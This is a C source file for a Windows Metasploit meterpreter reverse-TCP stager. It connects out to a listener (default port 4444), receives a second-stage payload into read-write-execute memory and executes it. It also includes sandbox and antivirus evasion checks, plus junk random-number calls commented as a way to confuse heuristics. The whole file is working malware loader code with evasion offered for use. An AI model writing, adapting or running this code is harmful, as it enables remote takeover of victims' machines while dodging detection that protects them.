#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>

//Function Headers
void winsock_init();
void Kick(SOCKET my_socket, char * error);
void genlol();
int recv_all(SOCKET my_socket, void * buffer, int len);
SOCKET wsconnect(char * targetip, int port);
int random_in_range (unsigned int min, unsigned int max);
char* rev(char* str);
int sandbox_evasion();
inline void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort);

void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

void Kick(SOCKET my_socket, char * error) {
	printf("error: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}


void genlol(){
	int num1, num2, num3;
	num1=100;
	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
}

int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
		if (nret == SOCKET_ERROR)
			Kick(my_socket, "Could not receive data");
	}
	return tret;
}

SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		Kick(my_socket, "Can't initialize socket");
	target = gethostbyname(targetip);
	if (target == NULL)
		Kick(my_socket, "can't resolve target");
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		Kick(my_socket, "Could not connect");
	return my_socket;
}

//this function simply generates a random number between min/max, with fairly even distribution
int random_in_range (unsigned int min, unsigned int max)
{
  int base_random = rand(); /* in [0, RAND_MAX] */
  if (RAND_MAX == base_random){
	  return random_in_range(min, max);
  }
  /* now guaranteed to be in [0, RAND_MAX) */
  int range       = max - min,
      remainder   = RAND_MAX % range,
      bucket      = RAND_MAX / range;
  /* There are range buckets, plus one smaller interval
     within remainder of RAND_MAX */
  if (base_random < RAND_MAX - remainder) {
    return min + base_random/bucket;
  } else {
    return random_in_range (min, max);
  }
}

//this is non working xor nonsense, i literally have no idea whats going on right now.
char* rev(char* str)
{
  int end=strlen(str)-1;
  int i;
  for(i=5; i<end; i++)
  {
  	str[i] ^= 1;
  }
  return str;
}

//Evade the sandbox
int sandbox_evasion(){
	//================================
	//begin sandbox evasssioooooon
	MSG msg;
	DWORD tc;
	//check to see if the application is fully loaded, apparently AV hates peekmessage
	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
		return -1;
	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
		return -1;
	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
	tc = GetTickCount();
	Sleep(650);
	if (((GetTickCount() - tc) / 300) != 2)
		return -1;
	//=================================
	return 0;
}


//The metasploit-loader extracted into its own function.
//Works with 32 or 64 bit meterpreter depending on if ISX64 is defined or not
void reverse_tcp_meterpreter(char * listenerIP,unsigned int listenerPort){
	ULONG32 size;
	char * buffer;
	void (*function)();
	#ifndef ISX64
		//Not 64 bit
		int movCmdSize = 1;
		int ptrSize = 4;
		char movCmd[] = {0xBF};
	#else
		//Is 64 bit
		int movCmdSize = 2;
		int ptrSize = 8;
		char movCmd[] = {0x48,0xBF};
	#endif

	winsock_init();

	//start the socket homie
	SOCKET my_socket = wsconnect(listenerIP, listenerPort);
	//receive 4 bytes which indicates the size of the next payload
	int count = recv(my_socket, (char *)&size, 4, 0);
	//check for issues
	if (count != 4 || size <= 0)
		Kick(my_socket, "bad length value\n");

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================	

	//allocate the RWX buffer
	buffer = VirtualAlloc(0, size + movCmdSize + ptrSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================

	//check the buffer for issues
	if (buffer == NULL)
		Kick(my_socket, "bad buffer\n");
	//puts mov on to the front of the buffer
	memcpy(buffer, movCmd, movCmdSize);

	//================================
	//burn out the clock, and confuse heuristics with some random number generation	
	genlol();
	//================================

	//copies the socket pointer onto the buffer after the move command
	//see this post for more infor http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
	memcpy(buffer + movCmdSize, &my_socket, ptrSize);

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================

	//receives the rest of the data from the socket (based on the size received before)
	count = recv_all(my_socket, buffer + movCmdSize + ptrSize, size);
	//cast the buffer as a function?
	function = (void (*)())buffer;
	//execute dat meterpreter
	function();
}

int main(int argc, char *argv[]) {
	//this program was meant to be run from the command line, so i added this so it would work
	char * defaultListenerIP = "ListenerIP";
	unsigned int defaultListenerPort = 4444;

	sandbox_evasion();

	//If command line parameters are given, use those instead of defaults.
	if(argc == 3){
		reverse_tcp_meterpreter(argv[1], atoi(argv[2]));
	}else{
		reverse_tcp_meterpreter(defaultListenerIP, defaultListenerPort);
	}

	return 0;
}
